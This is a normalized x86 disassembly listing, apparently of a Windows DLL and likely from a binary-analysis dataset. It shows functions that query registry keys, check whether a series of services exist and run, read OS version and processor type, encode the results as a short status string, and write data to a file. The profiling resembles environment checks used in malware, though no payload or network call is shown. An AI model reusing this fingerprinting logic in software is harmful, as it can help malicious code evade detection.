mov [ ebp - 0x13 ] ax
mov [ ebp - 0x11 ] al
mov [ ebp - 0x18 ] ebx
mov [ ebp - 0x1c ] ebx
call sub_1001a818
add esp 0x4
mov [ ebp - 0x20 ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_10012700
mov esi eax
jmp r-xdata
push 0x36
push rw-data
mov ecx esi
call sub_10012770
lea eax [ ebp - 0x18 ]
push eax
push ebx
push ebx
push ebx
mov ecx esi
call j_sub_100127b0
mov ecx [ edi ]
mov ebx [ RegQueryValueExW@IAT ]
push eax
push ecx
call ebx
test eax eax
je r-xdata
cmp esi ebx
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0x74
push rw-data
mov ecx esi
call sub_10012770
push edi
push 0x1
push ebx
mov ecx esi
call j_sub_100127b0
push eax
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
lea edx [ ebp - 0x18 ]
push edx
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x1c ]
push ecx
push 0x0
mov ecx esi
call j_sub_100127b0
mov edx [ edi ]
push eax
push edx
call ebx
test eax eax
je r-xdata
test esi esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov al [ ebp - 0x14 ]
push 0x14
push rw-data
mov ecx esi
mov [ ebp - 0xe ] al
call sub_10012770
lea ecx [ ebp - 0x18 ]
push ecx
push 0x0
push 0x0
push 0x0
mov ecx esi
call j_sub_100127b0
mov edx [ edi ]
push eax
push edx
call ebx
test eax eax
je r-xdata
test esi esi
jmp r-xdata
je r-xdata
lea eax [ ebp - 0x18 ]
push eax
lea ecx [ ebp - 0x14 ]
push ecx
lea edx [ ebp - 0x1c ]
push edx
push 0x0
mov ecx esi
call j_sub_100127b0
push eax
mov eax [ edi ]
push eax
call ebx
test eax eax
je r-xdata
test esi esi
jmp r-xdata
mov cl [ ebp - 0x14 ]
push 0x2c
mov [ ebp - 0xd ] cl
push rw-data
mov ecx esi
call sub_10012770
lea edx [ ebp - 0x18 ]
push edx
push 0x0
push 0x0
push 0x0
mov ecx esi
call j_sub_100127b0
push eax
mov eax [ edi ]
push eax
call ebx
test eax eax
je r-xdata
test esi esi
jmp r-xdata
lea ecx [ ebp - 0x18 ]
push ecx
lea edx [ ebp - 0x14 ]
push edx
lea eax [ ebp - 0x1c ]
push eax
push 0x0
mov ecx esi
call j_sub_100127b0
mov ecx [ edi ]
push eax
push ecx
call ebx
test eax eax
je r-xdata
test esi esi
jmp r-xdata
mov bl [ ebp - 0x14 ]
test esi esi
je r-xdata
test esi esi
jmp r-xdata
mov edx [ edi ]
push edx
call [ RegCloseKey@IAT ]
add bl [ ebp - 0xd ]
add bl [ ebp - 0xe ]
movzx eax bl
cmp eax 0x7
ja r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
jmp [ eax * 4 + jump_table_100166cc ]
mov eax [ edi + 0x4 ]
mov [ eax + 0x2 ] 0x1
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x2 ] 0x2
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov edx [ edi + 0x4 ]
mov [ edx + 0x2 ] 0x3
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov eax [ edi + 0x4 ]
mov [ eax + 0x2 ] 0x4
sub_100166f0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002daab
mov eax [ fs : 0x0 ]
push eax
sub esp 0x10
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi ecx
xor eax eax
xor ebx ebx
push 0x18
mov [ ebp - 0x10 ] 0x0
mov [ ebp - 0xf ] ax
mov [ ebp - 0xd ] al
mov [ ebp - 0x14 ] ebx
mov [ ebp - 0x18 ] ebx
call sub_1001a818
add esp 0x4
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] ebx
cmp eax ebx
je r-xdata
xor esi esi
mov ecx eax
call sub_10012700
mov esi eax
jmp r-xdata
push 0x1e
push rw-data
mov ecx esi
call sub_10012770
lea eax [ ebp - 0x14 ]
push eax
push ebx
push ebx
push ebx
mov ecx esi
call j_sub_100127b0
mov ecx [ edi ]
mov ebx [ RegQueryValueExW@IAT ]
push eax
push ecx
call ebx
test eax eax
je r-xdata
cmp esi ebx
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0xb2
push rw-data
mov ecx esi
call sub_10012770
push edi
push 0x1
push ebx
mov ecx esi
call j_sub_100127b0
push eax
push 0x80000002
call [ RegOpenKeyExW@IAT ]
test eax eax
je r-xdata
lea eax [ ebp - 0x14 ]
push eax
lea ecx [ ebp - 0x10 ]
push ecx
lea edx [ ebp - 0x18 ]
push edx
push 0x0
mov ecx esi
call j_sub_100127b0
push eax
mov eax [ edi ]
push eax
call ebx
test eax eax
je r-xdata
mov edx [ edi + 0x4 ]
mov [ edx + 0x3 ] 0x1
test esi esi
jmp r-xdata
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn
test esi esi
je r-xdata
test esi esi
jmp r-xdata
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov edx [ edi + 0x4 ]
mov [ edx + 0x3 ] 0x1
mov ecx [ edi + 0x4 ]
mov [ ecx + 0x3 ] 0x0
jmp r-xdata
mov eax [ edi ]
push eax
call [ RegCloseKey@IAT ]
sub_10016860
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dadb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x1
xor esi esi
push esi
push esi
mov [ ebp - 0x30 ] ecx
call [ OpenSCManagerW@IAT ]
mov edi eax
cmp edi esi
je r-xdata
push edi
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0xe
push rw-data
mov ecx esi
call sub_10012770
push 0x4
mov ecx esi
call j_sub_100127b0
push eax
push edi
call [ OpenServiceW@IAT ]
mov ebx eax
test esi esi
je r-xdata
mov ecx eax
call sub_10012700
mov esi eax
test ebx ebx
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov edx [ ebp - 0x30 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x4 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
push ebx
call [ QueryServiceStatus@IAT ]
mov eax [ ebp - 0x28 ]
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + 0x4 ] 0x0
jmp r-xdata
cmp eax 0x7
je r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0x30 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x4 ] 0x1
jmp r-xdata
sub_10016980
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dadb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x1
xor esi esi
push esi
push esi
mov [ ebp - 0x30 ] ecx
call [ OpenSCManagerW@IAT ]
mov edi eax
cmp edi esi
je r-xdata
push edi
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0x8
push rw-data
mov ecx esi
call sub_10012770
push 0x4
mov ecx esi
call j_sub_100127b0
push eax
push edi
call [ OpenServiceW@IAT ]
mov ebx eax
test esi esi
je r-xdata
mov ecx eax
call sub_10012700
mov esi eax
test ebx ebx
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov edx [ ebp - 0x30 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x5 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
push ebx
call [ QueryServiceStatus@IAT ]
mov eax [ ebp - 0x28 ]
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + 0x5 ] 0x0
jmp r-xdata
cmp eax 0x7
je r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0x30 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x5 ] 0x1
jmp r-xdata
sub_10016aa0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dadb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x1
xor esi esi
push esi
push esi
mov [ ebp - 0x30 ] ecx
call [ OpenSCManagerW@IAT ]
mov edi eax
cmp edi esi
je r-xdata
push edi
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0x22
push rw-data
mov ecx esi
call sub_10012770
push 0x4
mov ecx esi
call j_sub_100127b0
push eax
push edi
call [ OpenServiceW@IAT ]
mov ebx eax
test esi esi
je r-xdata
mov ecx eax
call sub_10012700
mov esi eax
test ebx ebx
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov edx [ ebp - 0x30 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x6 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
push ebx
call [ QueryServiceStatus@IAT ]
mov eax [ ebp - 0x28 ]
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + 0x6 ] 0x0
jmp r-xdata
cmp eax 0x7
je r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0x30 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x6 ] 0x1
jmp r-xdata
sub_10016bc0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dadb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x1
xor esi esi
push esi
push esi
mov [ ebp - 0x30 ] ecx
call [ OpenSCManagerW@IAT ]
mov edi eax
cmp edi esi
je r-xdata
push edi
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0x1c
push rw-data
mov ecx esi
call sub_10012770
push 0x4
mov ecx esi
call j_sub_100127b0
push eax
push edi
call [ OpenServiceW@IAT ]
mov ebx eax
test esi esi
je r-xdata
mov ecx eax
call sub_10012700
mov esi eax
test ebx ebx
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov edx [ ebp - 0x30 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x7 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
push ebx
call [ QueryServiceStatus@IAT ]
mov eax [ ebp - 0x28 ]
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + 0x7 ] 0x0
jmp r-xdata
cmp eax 0x7
je r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0x30 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x7 ] 0x1
jmp r-xdata
sub_10016ce0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dadb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x1
xor esi esi
push esi
push esi
mov [ ebp - 0x30 ] ecx
call [ OpenSCManagerW@IAT ]
mov edi eax
cmp edi esi
je r-xdata
push edi
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0x1e
push rw-data
mov ecx esi
call sub_10012770
push 0x4
mov ecx esi
call j_sub_100127b0
push eax
push edi
call [ OpenServiceW@IAT ]
mov ebx eax
test esi esi
je r-xdata
mov ecx eax
call sub_10012700
mov esi eax
test ebx ebx
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov edx [ ebp - 0x30 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x8 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
push ebx
call [ QueryServiceStatus@IAT ]
mov eax [ ebp - 0x28 ]
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + 0x8 ] 0x0
jmp r-xdata
cmp eax 0x7
je r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0x30 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x8 ] 0x1
jmp r-xdata
sub_10016e00
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dadb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x1
xor esi esi
push esi
push esi
mov [ ebp - 0x30 ] ecx
call [ OpenSCManagerW@IAT ]
mov edi eax
cmp edi esi
je r-xdata
push edi
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0xa
push rw-data
mov ecx esi
call sub_10012770
push 0x4
mov ecx esi
call j_sub_100127b0
push eax
push edi
call [ OpenServiceW@IAT ]
mov ebx eax
test esi esi
je r-xdata
mov ecx eax
call sub_10012700
mov esi eax
test ebx ebx
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov edx [ ebp - 0x30 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x9 ] 0x0
lea eax [ ebp - 0x2c ]
push eax
push ebx
call [ QueryServiceStatus@IAT ]
mov eax [ ebp - 0x28 ]
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + 0x9 ] 0x0
jmp r-xdata
cmp eax 0x7
je r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0x30 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0x9 ] 0x1
jmp r-xdata
sub_10016f20
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dadb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x1
xor esi esi
push esi
push esi
mov [ ebp - 0x30 ] ecx
call [ OpenSCManagerW@IAT ]
mov edi eax
cmp edi esi
je r-xdata
push edi
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0x1e
push rw-data
mov ecx esi
call sub_10012770
push 0x4
mov ecx esi
call j_sub_100127b0
push eax
push edi
call [ OpenServiceW@IAT ]
mov ebx eax
test esi esi
je r-xdata
mov ecx eax
call sub_10012700
mov esi eax
test ebx ebx
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov edx [ ebp - 0x30 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0xa ] 0x0
lea eax [ ebp - 0x2c ]
push eax
push ebx
call [ QueryServiceStatus@IAT ]
mov eax [ ebp - 0x28 ]
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + 0xa ] 0x0
jmp r-xdata
cmp eax 0x7
je r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0x30 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0xa ] 0x1
jmp r-xdata
sub_10017040
push ebp
mov ebp esp
push 0xffffffff
push sub_1002dadb
mov eax [ fs : 0x0 ]
push eax
sub esp 0x28
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push ebx
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
push 0x1
xor esi esi
push esi
push esi
mov [ ebp - 0x30 ] ecx
call [ OpenSCManagerW@IAT ]
mov ebx eax
cmp ebx esi
je r-xdata
push ebx
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
pop ebx
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
push 0x18
call sub_1001a818
add esp 0x4
mov [ ebp - 0x34 ] eax
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0x18
push rw-data
mov ecx esi
call sub_10012770
push 0x4
mov ecx esi
call j_sub_100127b0
push eax
push ebx
call [ OpenServiceW@IAT ]
mov edi eax
test esi esi
je r-xdata
mov ecx eax
call sub_10012700
mov esi eax
test edi edi
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
mov edx [ ebp - 0x30 ]
mov eax [ edx + 0x4 ]
mov [ eax + 0xb ] 0x0
lea eax [ ebp - 0x2c ]
push eax
push edi
call [ QueryServiceStatus@IAT ]
mov eax [ ebp - 0x28 ]
cmp eax 0x1
je r-xdata
mov eax [ ebp - 0x30 ]
mov ecx [ eax + 0x4 ]
mov [ ecx + 0xb ] 0x0
jmp r-xdata
cmp eax 0x7
je r-xdata
push edi
call [ CloseServiceHandle@IAT ]
mov ecx [ ebp - 0x30 ]
mov edx [ ecx + 0x4 ]
mov [ edx + 0xb ] 0x1
jmp r-xdata
sub_10017160
push ebp
mov ebp esp
push 0xffffffff
push sub_1002db13
mov eax [ fs : 0x0 ]
push eax
sub esp 0x68
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x10 ] eax
push esi
push edi
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
xor eax eax
xor esi esi
push 0x18
mov [ ebp - 0x4c ] ecx
mov [ ebp - 0x70 ] esi
mov [ ebp - 0x6c ] eax
mov [ ebp - 0x68 ] eax
mov [ ebp - 0x64 ] eax
mov [ ebp - 0x60 ] eax
mov [ ebp - 0x5c ] eax
mov [ ebp - 0x58 ] eax
mov [ ebp - 0x54 ] eax
mov [ ebp - 0x50 ] eax
call sub_1001a818
add esp 0x4
mov [ ebp - 0x74 ] eax
mov [ ebp - 0x4 ] esi
cmp eax esi
je r-xdata
push 0xc
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0xffffffff
call sub_10012790
push 0x14
push rw-data
mov ecx esi
call sub_10012770
lea eax [ ebp - 0x48 ]
push eax
mov ecx esi
call sub_10012d50
push 0x1a
push rw-data
mov ecx esi
mov [ ebp - 0x4 ] 0x1
call sub_10012770
lea ecx [ ebp - 0x2c ]
push ecx
mov ecx esi
call sub_10012c50
cmp [ ebp - 0x34 ] 0x10
mov ecx [ ebp - 0x48 ]
jae r-xdata
mov ecx eax
call sub_10012700
mov esi eax
cmp [ eax + 0x14 ] 0x8
jb r-xdata
lea ecx [ ebp - 0x48 ]
push ecx
push eax
call [ GetModuleHandleW@IAT ]
push eax
call [ GetProcAddress@IAT ]
cmp [ ebp - 0x18 ] 0x8
mov edi eax
jb r-xdata
mov eax [ eax ]
xor eax eax
mov [ ebp - 0x18 ] 0x7
mov [ ebp - 0x1c ] 0x0
mov [ ebp - 0x2c ] ax
test esi esi
je r-xdata
mov edx [ ebp - 0x2c ]
push edx
call sub_10019ce4
add esp 0x4
test edi edi
je r-xdata
mov ecx esi
call sub_10012740
push esi
call sub_10019ce4
add esp 0x4
lea edx [ ebp - 0x70 ]
push edx
call [ GetSystemInfo@IAT ]
lea ecx [ ebp - 0x70 ]
push ecx
call edi
jmp r-xdata
test ax ax
jne r-xdata
mov eax [ ebp - 0x4c ]
mov ecx [ eax + 0x4 ]
mov [ ecx + 0x1 ] 0x1
jmp r-xdata
mov eax [ ebp - 0x70 ]
cmp ax 0x9
jne r-xdata
cmp [ ebp - 0x34 ] 0x10
jb r-xdata
mov edx [ ebp - 0x4c ]
mov eax [ edx + 0x4 ]
mov [ eax + 0x1 ] 0x0
mov ecx [ ebp - 0xc ]
mov [ fs : 0x0 ] ecx
pop ecx
pop edi
pop esi
mov ecx [ ebp - 0x10 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
mov ecx [ ebp - 0x48 ]
push ecx
call sub_10019ce4
add esp 0x4
sub_100172e0
push ebp
mov ebp esp
sub esp 0x118
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
push esi
push edi
push 0x110
lea eax [ ebp - 0x114 ]
push 0x0
push eax
mov esi ecx
call sub_1001a9b0
mov edi [ GetVersionExW@IAT ]
add esp 0xc
lea ecx [ ebp - 0x118 ]
push ecx
mov [ ebp - 0x118 ] 0x114
call edi
cmp eax 0x1
jne r-xdata
mov ecx [ ebp - 0x4 ]
pop edi
xor ecx ebp
pop esi
call sub_1001a809
mov esp ebp
pop ebp
retn
lea edx [ ebp - 0x118 ]
push edx
call edi
cmp [ ebp - 0x114 ] 0x6
jae r-xdata
cmp [ ebp - 0x110 ] 0x1
jne r-xdata
mov eax [ esi + 0x4 ]
mov ecx esi
mov [ eax ] 0x0
call sub_10017160
mov ecx [ esi + 0x4 ]
pop edi
mov [ ecx + 0x2 ] 0x0
pop esi
mov ecx [ ebp - 0x4 ]
xor ecx ebp
call sub_1001a809
mov esp ebp
pop ebp
retn
cmp [ ebp - 0x110 ] 0x2
jne r-xdata
mov edx [ esi + 0x4 ]
mov ecx esi
mov [ edx ] 0x1
call sub_10017160
mov ecx esi
call sub_10016460
mov eax [ esi + 0x4 ]
mov ecx esi
mov [ eax ] 0x2
call sub_10017160
mov ecx esi
call sub_10016460
sub_100173b0
push ebp
mov ebp esp
push esi
mov esi ecx
call sub_100172e0
mov ecx esi
call sub_100166f0
mov ecx esi
call sub_10016860
mov ecx esi
call sub_10016980
mov ecx esi
call sub_10016aa0
mov ecx esi
call sub_10016bc0
mov ecx esi
call sub_10016ce0
mov ecx esi
call sub_10016e00
mov ecx esi
call sub_10016f20
mov ecx esi
call sub_10017040
xor ecx ecx
mov edx 0xc
mov eax [ esi + 0x4 ]
add [ eax + ecx ] 0x30
inc ecx
dec edx
jne r-xdata
mov ecx [ ebp + 0x8 ]
mov [ ecx ] 0xc
mov eax [ esi + 0x4 ]
pop esi
pop ebp
retn 0x4
sub_10017420
push esi
mov esi ecx
mov [ esi ] r--data
mov [ esi + 0x4 ] r--data
mov ecx 0x8
push edi
mov [ esi + 0x58 ] 0x0
cmp [ esi + 0x5c ] ecx
jb r-xdata
lea eax [ esi + 0x48 ]
mov eax [ esi + 0x48 ]
jmp r-xdata
xor ecx ecx
mov [ esi + 0x5c ] 0x7
mov [ esi + 0x58 ] 0x0
mov edi 0x8
mov [ esi + 0x48 ] cx
cmp [ esi + 0x38 ] edi
jb r-xdata
mov eax [ esi + 0x48 ]
push eax
call sub_10019ce4
add esp 0x4
xor edx edx
mov [ eax ] dx
cmp [ esi + 0x5c ] ecx
jb r-xdata
xor eax eax
mov [ esi + 0x38 ] 0x7
mov [ esi + 0x34 ] 0x0
mov [ esi + 0x24 ] ax
cmp [ esi + 0x1c ] edi
jb r-xdata
mov edx [ esi + 0x24 ]
push edx
call sub_10019ce4
add esp 0x4
mov [ esi + 0x1c ] 0x7
mov [ esi + 0x18 ] 0x0
xor edx edx
pop edi
mov [ esi + 0x8 ] dx
pop esi
retn
mov ecx [ esi + 0x8 ]
push ecx
call sub_10019ce4
add esp 0x4
sub_100174d0
push ebp
mov ebp esp
push 0xffffffff
push sub_1002db50
mov eax [ fs : 0x0 ]
push eax
sub esp 0xc
push ebx
push esi
push edi
mov eax [ rw-data ]
xor eax ebp
push eax
lea eax [ ebp - 0xc ]
mov [ fs : 0x0 ] eax
mov edi [ CreateFileW@IAT ]
mov ebx [ GetLastError@IAT ]
mov [ ebp - 0xd ] 0x0
jmp r-xdata
cmp [ ebp + 0x1c ] 0x8
mov eax [ ebp + 0x8 ]
jae r-xdata
push 0x0
push 0x2
push 0x4
push 0x0
push 0x0
push 0xc0000000
push eax
call edi
mov esi eax
call ebx
cmp eax 0x20
jne r-xdata
lea eax [ ebp + 0x8 ]
cmp esi 0xffffffff
jne r-xdata
push 0x14
call [ Sleep@IAT ]
mov al [ ebp - 0xd ]
inc al
mov [ ebp - 0xd ] al
cmp al 0x5
jb r-xdata
push 0x2
xor ebx ebx
push ebx
push ebx
push esi
mov [ ebp - 0x14 ] ebx
call [ SetFilePointer@IAT ]
mov eax [ ebp + 0x24 ]
mov ecx [ eax + 0x4 ]
mov edi [ WriteFile@IAT ]
push ebx
lea edx [ ebp - 0x14 ]
push edx
push 0x4
lea eax [ ebp - 0x18 ]
push eax
push esi
mov [ ebp - 0x18 ] ecx
call edi
cmp [ ebp - 0x14 ] 0x4
je r-xdata
cmp [ ebp + 0x1c ] 0x8
jb r-xdata
mov eax [ ebp + 0x24 ]
mov edx [ ebp - 0x18 ]
mov eax [ eax ]
push ebx
lea ecx [ ebp - 0x14 ]
push ecx
push edx
push eax
push esi
call edi
mov eax [ ebp - 0x18 ]
